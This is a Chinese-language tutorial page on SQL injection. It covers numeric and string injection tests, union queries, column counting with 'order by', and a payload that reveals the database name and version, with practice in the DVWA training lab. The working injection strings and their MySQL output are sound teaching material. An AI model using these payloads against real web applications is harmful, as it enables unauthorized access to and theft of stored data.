---
slug: /net-security/06/01
---

SQL 注入漏洞：没有对输入做一个校验和过滤，使得输入变为 SQL 语句并执行。

SQL 注入条件：

1. 参数对用户来说可控
2. 参数最终会作为数据库查询语句之一



## 类型

### 数字型

输入的参数为整型时，若存在注入漏洞，称为**数字型注入**漏洞。测试步骤：

1. 加单引号，对应 URL：`www.test.com/test.php?id=1’`

   对应的 SQL 语句：`select * from table where id=1’;` 查询出错，则可能存在漏洞。

2. 加 `and 1 = 1`，对应 URL：`www.test.com/test.php?id=1 and 1 = 1;`

   对应的 SQL 语句：`select * from table where id = 1 and 1 = 1;`。 查询正常，则增加存在漏洞可能性。

3. 加 `and 1 = 2`，对应 URL：`www.test.com/test.php?id = 1 and 1 = 2;`

   对应的 SQL 语句：`select * from table where id = 1 and 1 = 2;` 查询失败，则确定漏洞存在。 



### 字符型

输入参数为字符串时，若存在注入漏洞，成为**字符型注入**漏洞。测试步骤：

尝试输入 `1' or 1 = 1#`

对应的 SQL 语句：`select * from table where id='1' or 1 = 1 #'`，如果查询得到所有数据，则确定漏洞存在。

<br />

在 DVWA 靶场环境中，可以在 SQL Injection 练习：

![](http://img.wukaipeng.com/2023/0922-080220-image-20230922080219805.png)



### Union 注入

`union` 可以联合查询多个表：

```sql
mysql> select first_name, last_name from users where user_id = 1 union all select first_name, last_name from users where user_id = 2;
+------------+-----------+
| first_name | last_name |
+------------+-----------+
| admin      | admin     |
| Gordon     | Brown     |
+------------+-----------+
2 rows in set (0.00 sec)
```

`union` 查询的表的列数要一致。

注入的时候可以用  `order by 2` 去知道后端查询语句有多少列：`1' order by  2#`

`order by <number>` 这里是根据查询结果中的某列进行排序，如果 `number` 大于查询出来的列出，那么会报错：

```sql
# 根据结果第一列进行排序 ✅
mysql> select first_name, last_name from users where user_id = '1' or 1 = 1 order by 1 #'
    -> ;
+------------+-----------+
| first_name | last_name |
+------------+-----------+
| admin      | admin     |
| Bob        | Smith     |
| Gordon     | Brown     |
| Hack       | Me        |
| Pablo      | Picasso   |
+------------+-----------+
5 rows in set (0.00 sec)

# 根据结果第二列进行排序，正常 ✅
mysql> select first_name, last_name from users where user_id = '1' or 1 = 1 order by 2 #'
    -> ;
+------------+-----------+
| first_name | last_name |
+------------+-----------+
| admin      | admin     |
| Gordon     | Brown     |
| Hack       | Me        |
| Pablo      | Picasso   |
| Bob        | Smith     |
+------------+-----------+
5 rows in set (0.00 sec)

# 根据结果第三列进行排序，报错 ❌
mysql> select first_name, last_name from users where user_id = '1' or 1 = 1 order by 3 #'
    -> ;
ERROR 1054 (42S22): Unknown column '3' in 'order clause'
```

构造 `union` 语句获取数据库名称和版本：`1' union select database(), version() ;#`

![](http://img.wukaipeng.com/2023/0922-085205-image-20230922085204940.png)



























